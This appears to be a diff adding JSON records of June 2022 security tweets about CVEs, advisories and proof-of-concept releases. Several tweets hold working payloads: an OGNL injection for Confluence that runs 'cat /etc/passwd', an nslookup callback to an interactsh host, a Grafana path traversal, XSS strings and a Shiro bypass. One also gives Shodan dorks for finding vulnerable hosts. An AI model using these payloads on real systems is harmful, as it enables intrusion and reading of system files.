+    "tweetfavorites": 74,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 30,
+    "tweettext": "⚠️ Horde Webmail is affected by an unpatched code vulnerability (CVE-2022-30287) that allows attackers to take over the mail server when a malicious email is opened. Learn more from our security research:\n\nhttps://t.co/bgpUsljVR3\n\n#appsec #security #vulnerability",
+    "tweettime": "2022-06-01, 15:22:41",
+    "tweeturl": "https://twitter.com/SonarSource/status/1532019810619559939",
+    "username": "SonarSource"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-806/"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "[ZDI-22-806|CVE-2022-23088] FreeBSD 802.11 Network Subsystem Heap-based Buffer Overflow Remote Code Execution Vulnerability (CVSS 8.3) https://t.co/llalKSSlaZ",
+    "tweettime": "2022-06-01, 14:45:14",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1532010387062894592",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://blog.0patch.com/2022/06/free-micropatches-for-follina-microsoft.html"
+    ],
+    "tweetfavorites": 63,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 36,
+    "tweettext": "Free Micropatches For \"Follina\" Microsoft Diagnostic Tool Remote Code Execution 0day (CVE-2022-30190) #Follina\nhttps://t.co/lyNPrgdObJ https://t.co/6UABGE6qor",
+    "tweettime": "2022-06-01, 14:30:17",
+    "tweeturl": "https://twitter.com/0patch/status/1532006627225784323",
+    "username": "0patch"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html"
+    ],
+    "tweetfavorites": 86,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "Trend Micro has a report out on the recent attacks targeting CVE-2022-29464, a remote code execution vulnerability in WSO2 servers\n\nhttps://t.co/DYFAGxkiQn https://t.co/EQotRJbkyu",
+    "tweettime": "2022-06-01, 08:43:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1531919227539570690",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://twitter.com/cyb3rops/status/1531154093451902978"
+    ],
+    "tweetfavorites": 125,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 40,
+    "tweettext": "1/ The exploitation of CVE-2022-30190 #Follina isn’t hard to detect\n\nIn fact, proc creation logs with parent info are enough\nhttps://t.co/fH8Ww1f6JA\n\nIt also isn’t hard to apply the workaround via GPO\n\nThe problem with this 0day is that 99% of the possible victims …",
+    "tweettime": "2022-06-01, 06:24:57",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1531884486341840897",
+    "username": "cyb3rops"
+}
+{
+    "expanded_url": [
+        "https://github.co/3Oys62x"
+    ],
+    "tweetfavorites": 189,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "In this post @mmolgtm goes through the details of CVE-2022-1134, a type confusion in Chrome, and shows how to gain remote code execution in the Chrome renderer using this bug. https://t.co/T4643hqF08",
+    "tweettime": "2022-06-30, 09:31:14",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1542440614637223936",
+    "username": "GHSecurityLab"
+}
+{
+    "tweetfavorites": 201,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 51,
+    "tweettext": "1) CVE-2021-21042 to disclosure user32.dll's base addr.\n2) CVE-2019-7040 to get RCE.\n\nNo sbx, so protected mode is off. To be released soon... https://t.co/b3DiUxcdZW",
+    "tweettime": "2022-06-29, 18:23:23",
+    "tweeturl": "https://twitter.com/j00sean/status/1542212146313969665",
+    "username": "j00sean"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/red-team-blog-cve-2022-28219"
+    ],
+    "tweetfavorites": 739,
+    "tweetquotes": 17,
+    "tweetreplies": 6,
+    "tweetretweets": 268,
+    "tweettext": "Check out a recent finding by one of our own, Naveen Sunkavally. CVE-2022-28219 is an unauth RCE for ManageEngine ADAudit Plus. \n\nThis XXE -&gt; Deserialization chain often leads to host compromise as well as priv'd AD creds. Check out the blog post and POC: https://t.co/bLHzhvSnLo",
+    "tweettime": "2022-06-29, 13:24:35",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1542136953004609536",
+    "username": "Horizon3Attack"
+}
+{
+    "tweetfavorites": 180,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 50,
+    "tweettext": "Apache Shiro CVE-2022-32532\nThis request can succeed\n\nGET /permit/any HTTP/1.1\nToken: momika\nAccess is not allowed when there is no token request header\n\nGET /permit/any HTTP/1.1\nIt can be bypassed in a simple way in special but common configurations\n\nGET /permit/a%0any HTTP/1.1",
+    "tweettime": "2022-06-29, 05:27:00",
+    "tweeturl": "https://twitter.com/momika233/status/1542016765030707206",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
+    ],
+    "tweetfavorites": 805,
+    "tweetquotes": 13,
+    "tweetreplies": 10,
+    "tweetretweets": 356,
+    "tweettext": "⚠️ Zimbra Mail pre-auth RCE via Path Traversal bug in unrar (CVE-2022-30333).  This is probably my most impactful bug so far, especially after Zimbra has been the target of a 0day campaign likely conducted by a state actor. More details in this blog post: https://t.co/8v0ujC1Nyl https://t.co/VZQm0NdqnU",
+    "tweettime": "2022-06-28, 15:06:05",
+    "tweeturl": "https://twitter.com/scannell_simon/status/1541800107909185537",
+    "username": "scannell_simon"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-871/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "[ZDI-22-871|CVE-2022-30157] Microsoft SharePoint Chart Deserialization of Untrusted Data Remote Code Execution Vulnerability (CVSS 8.8) https://t.co/rVlmeQCu9b",
+    "tweettime": "2022-06-23, 15:50:18",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1539999296405356546",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit"
+    ],
+    "tweetfavorites": 422,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 170,
+    "tweettext": "💥 We have reproduced CVE-2022-31626, an RCE in PHP &lt;= 7.4.29 which can be triggered via a rogue MySQL/MariaDB server!\n\nIt's a Heap Overflow, works with MySQLi/PDO, and doesn't require LOAD LOCAL INFILE.\n\nThe PoC 👉 https://t.co/vrtniSEHhu https://t.co/ElJJgl5d9j",
+    "tweettime": "2022-06-23, 01:52:39",
+    "tweeturl": "https://twitter.com/ptswarm/status/1539788492695371778",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://github.com/kuron3k0/Spring-Data-Mongodb-Example"
+    ],
+    "tweetfavorites": 151,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 61,
+    "tweettext": "https://t.co/qmyC5hEBG5\nCVE-2022-22980: Spring Data MongoDB SpEL Expression injection vulnerability through annotated repository query methods https://t.co/jFv7mXtwdt",
+    "tweettime": "2022-06-21, 13:30:30",
+    "tweeturl": "https://twitter.com/momika233/status/1539239336558104576",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 177,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 68,
+    "tweettext": "CVE-2022-21972: Windows Server VPN Remote Kernel Use After Free Vulnerability (Part 1) https://t.co/2tNZ3gmi81",
+    "tweettime": "2022-06-21, 08:41:54",
+    "tweeturl": "https://twitter.com/reverseame/status/1539166711072624642",
+    "username": "reverseame"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "https://t.co/NtvlODMlQp\nCVE-2022-26809",
+    "tweettime": "2022-06-19, 13:46:03",
+    "tweeturl": "https://twitter.com/momika233/status/1538518477342130176",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 436,
+    "tweetquotes": 5,
+    "tweetreplies": 6,
+    "tweetretweets": 199,
+    "tweettext": "🧨 Windows RPC Critical Vulnerability (CVE-2022-26809)\n\nYou can search for vulnerable hosts in Shodan by dorks:\n\nport:445\n\nproduct:\"Microsoft RPC Endpoint Mapper\"\n\nLink to PoC https://t.co/AXQC2W0rmU\n\n#bugbountytips #CVE #cybersecurity #infosec #bugbounty https://t.co/r7uf5eWgji",
+    "tweettime": "2022-06-18, 20:01:12",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1538250496313413633",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/omair2084/CVE-2022-26937"
+    ],
+    "tweetfavorites": 451,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 162,
+    "tweettext": "From what was available online, a rough PoC for Windows NFS vulnerability (CVE-2022-26937). https://t.co/tk43aHWHpa https://t.co/KR1yibxLx7",
+    "tweettime": "2022-06-17, 01:52:53",
+    "tweeturl": "https://twitter.com/w3bd3vil/status/1537614224595501056",
+    "username": "w3bd3vil"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/15/cve-2022-23088-exploiting-a-heap-overflow-in-the-freebsd-wi-fi-stack"
+    ],
+    "tweetfavorites": 169,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 62,
+    "tweettext": "CVE-2022-23088: A new guest blog from @m00nbsd describes a 13-yr-old heap overflow in the Wi-Fi stack that allows network-adjacent attackers to execute code on affected installations of FreeBSD Kernel. Includes root cause &amp; PoC. Read the details at https://t.co/NPHu6jkiaa",
+    "tweettime": "2022-06-16, 16:39:20",
+    "tweeturl": "https://twitter.com/thezdi/status/1537474918627131392",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.co/3mWLcTP"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "In this blog post @mmolgtm shows how to bypass various modern mitigation implemented in the Android kernel and exploit CVE-2022-22057 to gain root from a malicious Android app https://t.co/4d4pMOxNgu",
+    "tweettime": "2022-06-16, 16:05:29",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1537466400578609152",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    ],
+    "tweetfavorites": 59,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Volexity report detailing the exploitation of a Sophos firewall zero-day from earlier this year\n\nZero-day is tracked as CVE-2022-1040 and its exploitation was linked to \"DriftingCloud,\" a new APT that appears to be based in China\n\nhttps://t.co/NdMiOUsFkb https://t.co/U77hLLfadf",
+    "tweettime": "2022-06-16, 16:01:33",
+    "tweeturl": "https://twitter.com/campuscodi/status/1537465412807442432",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 14,
+    "tweettext": "Just scored 2 full-read SSRF bounties with this blog. Thank you @assetnote! Who do I send the beer to? 🍻\n\nTurning bad SSRF to good SSRF: Websphere Portal (CVE-2021-27748) -   https://t.co/iIlMtE874p",
+    "tweettime": "2022-06-16, 13:32:20",
+    "tweeturl": "https://twitter.com/systemDumb/status/1537427860209680384",
+    "username": "systemDumb"
+}
+{
+    "tweetfavorites": 80,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 25,
+    "tweettext": "🚒 Invision Community fixed an SSRF vulnerability (CVE-2021-40604) found by Mikhail Klyuchnikov!\n\nTimeline:\n✅ 06/23/2021 - The advisory is published\n😒 06/24/2021 - Requested CVE via MITRE\n😀 06/13/2022 - CVE was assigned\n\nThe PoC ⤵️\n\nThe \"gkey\" param is an unfollow token. https://t.co/jlvQwcm9QY",
+    "tweettime": "2022-06-16, 13:06:51",
+    "tweeturl": "https://twitter.com/ptswarm/status/1537421446946988036",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 43,
+    "tweettext": "CVE-2022-21972: Windows Server VPN Remote Kernel Use After Free Vulnerability https://t.co/Olq8qu8zpR",
+    "tweettime": "2022-06-16, 11:58:00",
+    "tweeturl": "https://twitter.com/pentest_swissky/status/1537404119127691267",
+    "username": "pentest_swissky"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/06/high-severity-rce-vulnerability.html"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 87,
+    "tweettext": "Researchers detail a recently reported high-severity #vulnerability (CVE-2022-25845) in the Fastjson library that could potentially be exploited for remote code execution attacks.\n\nRead: https://t.co/b0Gvl4lUhQ\n\n#infosec #sysadmin #DevOps #cybersecurity #hacking",
+    "tweettime": "2022-06-16, 08:29:26",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1537351630877696000",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-29149"
+    ],
+    "tweetfavorites": 163,
+    "tweetquotes": 11,
+    "tweetreplies": 3,
+    "tweetretweets": 70,
+    "tweettext": "OMI is back! @msftsecresponse published CVE-2022-29149, a new LPE vulnerability in OMI, the Azure agent that was vulnerable to #OMIGOD. Seems like manual update of the silently installed agent is required again in most cases \n\nhttps://t.co/Ga4hETg6i2",
+    "tweettime": "2022-06-15, 23:06:35",
+    "tweeturl": "https://twitter.com/41thexplorer/status/1537209987570847744",
+    "username": "41thexplorer"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    ],
+    "tweetfavorites": 113,
+    "tweetquotes": 6,
+    "tweetreplies": 0,
+    "tweetretweets": 79,
+    "tweettext": ".@Volexity offers a case study on real-world #zeroday exploitation of a Sophos XG Firewall via CVE-2022-1040 by #DriftingCloud. Read about man-in-the-middle attacks, stolen session cookies, and how this APT moved beyond the firewall: https://t.co/3TthlXpXe8 #threatintel #dfir",
+    "tweettime": "2022-06-15, 18:44:47",
+    "tweeturl": "https://twitter.com/Volexity/status/1537144102218870784",
+    "username": "Volexity"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190"
+    ],
+    "tweetfavorites": 251,
+    "tweetquotes": 10,
+    "tweetreplies": 1,
+    "tweetretweets": 72,
+    "tweettext": "https://t.co/EZlw4Vr9dV The official patch for CVE-2022-30190 is released. Added regular filtering to the RunScript function, which means that this vulnerability turns into a game that tries to bypass https://t.co/WnFQaDB3Hv",
+    "tweettime": "2022-06-15, 03:55:12",
+    "tweeturl": "https://twitter.com/80vul/status/1536920233255968769",
+    "username": "80vul"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/"
+    ],
+    "tweetfavorites": 236,
+    "tweetquotes": 6,
+    "tweetreplies": 5,
+    "tweetretweets": 110,
+    "tweettext": "CVE-2022-27924 allows an unauthenticated, remote attacker to dump clear-text creds from a Zimbra instance with default config. We used Memcache response injection to bypass restrictions. Apparently Zimbra is used by over 200.000. Patch now! https://t.co/7ziBH7G4ax",
+    "tweettime": "2022-06-14, 17:45:38",
+    "tweeturl": "https://twitter.com/scannell_simon/status/1536766828491456514",
+    "username": "scannell_simon"
+}
+{
+    "expanded_url": [
+        "https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/"
+    ],
+    "tweetfavorites": 121,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "CVE-2022-25845 – Analyzing the Fastjson “Auto Type Bypass” RCE vulnerability https://t.co/eZSzQB2xIc",
+    "tweettime": "2022-06-14, 15:43:06",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1536735993889316864",
+    "username": "_r_netsec"
+}
+{
+    "tweetfavorites": 262,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 52,
+    "tweettext": "I create a custom nuclei template for mass hunting recent CVE-2022-29455(XSS)\n#bugbounty #nuclei https://t.co/uMC9ldy3CJ",
+    "tweettime": "2022-06-14, 04:54:33",
+    "tweeturl": "https://twitter.com/tamimhasan404/status/1536572780325392384",
+    "username": "tamimhasan404"
+}
+{
+    "expanded_url": [
+        "https://github.com/tr3ee/CVE-2022-23222"
+    ],
+    "tweetfavorites": 538,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 189,
+    "tweettext": "CVE-2022-23222: Linux kernel through 5.15.14 allows local users to gain privileges because of the availability of pointer arithmetic via certain *_OR_NULL pointer types.\n\nPoC\nhttps://t.co/zFAfB0UXg3 https://t.co/lBT5BLTO6w",
+    "tweettime": "2022-06-12, 07:47:27",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1535891514387218432",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/aaronsvk/CVE-2022-30075"
+    ],
+    "tweetfavorites": 479,
+    "tweetquotes": 6,
+    "tweetreplies": 7,
+    "tweetretweets": 184,
+    "tweettext": "CVE-2022-30075: Authenticated Remote Code Execution in Tp-Link Routers.\n\nPoC\nhttps://t.co/AGyD2CVWA8 https://t.co/qU87X48x39",
+    "tweettime": "2022-06-12, 07:45:12",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1535890951226462208",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://cert.gov.ua/article/160530"
+    ],
+    "tweetfavorites": 122,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 64,
+    "tweettext": "Attempted cyberattack/operation aimed at Ukrainian media organizations (radio stations, newspapers, news agencies, etc.). Suspected Sandworm group trying to exploit CVE-2022-30190 (fresh, remote code execution vulnerability via Office/Word) https://t.co/UtHWUvnwCk https://t.co/yznXpfh7Ys",
+    "tweettime": "2022-06-11, 15:20:47",
+    "tweeturl": "https://twitter.com/lukOlejnik/status/1535643213712830466",
+    "username": "lukOlejnik"
+}
+{
+    "expanded_url": [
+        "https://github.com/aaronsvk/CVE-2022-30075"
+    ],
+    "tweetfavorites": 182,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 101,
+    "tweettext": "Researcher releases PoC exploit for a new authenticated RCE #vulnerability (CVE-2022-30075) affecting Tp-Link routers.\n\nhttps://t.co/MwaPmYk9HG\n\n\"If your Tp-Link router has backup and restore functionality and firmware is older than june 2022, it is probably vulnerable\" https://t.co/GtXG37KzNf",
+    "tweettime": "2022-06-11, 13:50:11",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1535620414268899329",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6015b5npx"
+    ],
+    "tweetfavorites": 161,
+    "tweetquotes": 7,
+    "tweetreplies": 4,
+    "tweetretweets": 82,
+    "tweettext": "Multiple adversaries and nation-state actors, including DEV-0401 and DEV-0234, are taking advantage of the Atlassian Confluence RCE vulnerability CVE-2022-26134. We urge customers to upgrade to the latest version or apply recommended mitigations: https://t.co/C3CykQgrOJ",
+    "tweettime": "2022-06-11, 00:24:59",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1535417776290111489",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "I just wrote a technical analysis blog about Confluence CVE-2022-26134, especially focus on Confluence version 7.18.0 where isSafeExpression is introduced and different ways that you can bypass it :). If you have any questions, please dm me :)\nhttps://t.co/AqWJ11qko5",
+    "tweettime": "2022-06-10, 15:42:05",
+    "tweeturl": "https://twitter.com/mr_r3bot/status/1535286185358401536",
+    "username": "mr_r3bot"
+}
+{
+    "tweetfavorites": 112,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "CVE-2022-31402 iTop 3.0.1 XSS Vulnerability\n\nhttp://localhost/itop/webservices/export-v2.php\"()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;N8Zn(9266)&lt;/ScRiPt&gt;",
+    "tweettime": "2022-06-10, 04:36:33",
+    "tweeturl": "https://twitter.com/momika233/status/1535118697466953728",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/7/cve-2022-26937-microsoft-windows-network-file-system-nlm-portmap-stack-buffer-overflow"
+    ],
+    "tweetfavorites": 155,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 77,
+    "tweettext": "The latest blog from the Trend Micro Research Team looks at CVE-2022-26937: a Microsoft Windows NFS NLM Portmap stack buffer overflow that could lead to RCE. They provide root cause, source code walkthrough, and detection guidance. https://t.co/FhKhIeoG35",
+    "tweettime": "2022-06-08, 14:27:58",
+    "tweeturl": "https://twitter.com/thezdi/status/1534542758991511557",
+    "username": "thezdi"
+}
+{
+    "tweetfavorites": 141,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "CVE-2022-1588 Contao 4.13.2 Cross-Site Scripting (XSS)\nURL: https://localhost/contao/\"&gt;&lt;svg//onload=alert('momika233')&gt;",
+    "tweettime": "2022-06-08, 01:39:15",
+    "tweeturl": "https://twitter.com/momika233/status/1534349304688967680",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 146,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 47,
+    "tweettext": "#CVE-2022-26134 Atlassian Confluence RCE \n\nboolean authenticate(String username, String password) https://t.co/rXZbj7pk70",
+    "tweettime": "2022-06-07, 13:47:09",
+    "tweeturl": "https://twitter.com/jas502n/status/1534170095932821504",
+    "username": "jas502n"
+}
+{
+    "tweetfavorites": 921,
+    "tweetquotes": 10,
+    "tweetreplies": 22,
+    "tweetretweets": 304,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd",
+    "tweettime": "2022-06-07, 09:30:36",
+    "tweeturl": "https://twitter.com/momika233/status/1534105534793920512",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1913/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 7,
+    "tweettext": "\"CVE-2022-30190 MSDT PowerShell Code Injection Vulnerability Analysis\" https://t.co/ViRj51xWLf (Chinese) by HuanGMz@KnownSec  404 Team . The original model of the vulnerability is code injection caused by the lack of filtering $ in the .AddScript() function parameter. https://t.co/Cbz3VnMbKI",
+    "tweettime": "2022-06-07, 06:29:54",
+    "tweeturl": "https://twitter.com/80vul/status/1534060061869285377",
+    "username": "80vul"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/blog/observed-in-the-wild-atlassian-confluence-server-cve-2022-26134"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 25,
+    "tweettext": "800+ unique IPs and counting... read fresh insights from our research team on zero-day vulnerability Atlassian Confluence CVE-2022-26134. https://t.co/dvG31gk1xv",
+    "tweettime": "2022-06-06, 22:38:29",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1533941426320310272",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://www.mozilla.org/en-US/security/bug-bounty/hall-of-fame/"
+    ],
+    "tweetfavorites": 82,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 8,
+    "tweettext": "Got a spot in Mozilla Hall of Fame (1st Quarter 2022) by reporting CVE-2022-26381 (Mozilla Firefox textPath Element Use-After-Free Remote Code Execution Vulnerability):\nhttps://t.co/RKW4yefPVL",
+    "tweettime": "2022-06-06, 21:44:06",
+    "tweeturl": "https://twitter.com/hosselot/status/1533927736888238090",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32275"
+    ],
+    "tweetfavorites": 333,
+    "tweetquotes": 10,
+    "tweetreplies": 2,
+    "tweetretweets": 103,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd URI. https://t.co/1LMJnFOkbZ",
+    "tweettime": "2022-06-06, 19:45:23",
+    "tweeturl": "https://twitter.com/CVEnew/status/1533897860583931905",
+    "username": "CVEnew"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 38,
+    "tweettext": "Technical Analysis and Exploitation of CVE-2022-26134, critical unauthenticated RCE in Confluence, by @rapid7  \n\nhttps://t.co/3xQzizl2ko\n\n#infosec #cybersecurity #bugbounty #pentest https://t.co/Mi65pQKUaL",
+    "tweettime": "2022-06-06, 19:00:09",
+    "tweeturl": "https://twitter.com/payloadartist/status/1533886478291714049",
+    "username": "payloadartist"
+}
+{
+    "tweetfavorites": 284,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 94,
+    "tweettext": "🦥 Everyone learned to run pip install colorama to exploit Atlassian Confluence RCE (CVE-2022-26134), so let’s see how the vulnerability works under the hood.\n\nHere we show our simplified payload which demonstrates a workflow inside the vulnerable code ⤵️ https://t.co/szijIM84hd",
+    "tweettime": "2022-06-06, 13:37:42",
+    "tweeturl": "https://twitter.com/ptswarm/status/1533805332409069568",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://www.reddit.com/r/blueteamsec/comments/v56qin/cve202226134_confluence_zero_day_remote_code/"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 10,
+    "tweettext": "/r/blueteamsec are now running one of our now (infamous?) threads on CVE-2022-26134 aka the Confluence Zero Day - with technical analysis, exploits, active exploitation updates, detections and more.. \n\nhttps://t.co/dHEkcymrkf",
+    "tweettime": "2022-06-06, 10:58:21",
+    "tweeturl": "https://twitter.com/ollieatnccgroup/status/1533765228072148994",
+    "username": "ollieatnccgroup"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134?fbclid=IwAR0tZiWJjBJHu5slC4ZUfGK00Bew8tbp2xCLrQvD0uZjkPLOvFUvzhmWtbE"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "CVE-2022-26134 Atlassian\n\n${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"cat /etc/passwd\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))}\n\nhttps://t.co/nrwWLejKgW https://t.co/YO1WzL9MJV",
+    "tweettime": "2022-06-06, 06:36:43",
+    "tweeturl": "https://twitter.com/wugeej/status/1533699386542534662",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://viz.greynoise.io/query/?gnql=tags%3A%22Atlassian%20Confluence%20Server%20CVE-2022-26134%20OGNL%20Injection%20Attempt%22"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 84,
+    "tweettext": "Widespread Atlassian Confluence CVE-2022-26134 exploitation, specifically that is *confirmed functional*, has just started. 23 unique IPs so far.\n\n-Tags available to all @GreyNoiseIO users now\n- Create an account to deploy a dynamic block list to block it\n\nhttps://t.co/dbXTw2LWY6 https://t.co/xXldngWdPH",
+    "tweettime": "2022-06-04, 17:31:37",
+    "tweeturl": "https://twitter.com/Andrew___Morris/status/1533139425122713600",
+    "username": "Andrew___Morris"
+}
+{
+    "tweetfavorites": 168,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 47,
+    "tweettext": "Confluence RCE (CVE-2022-26134)\nPoc:\n\n{{BaseURL}}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{{interactsh-url}}%22%29%7D/",
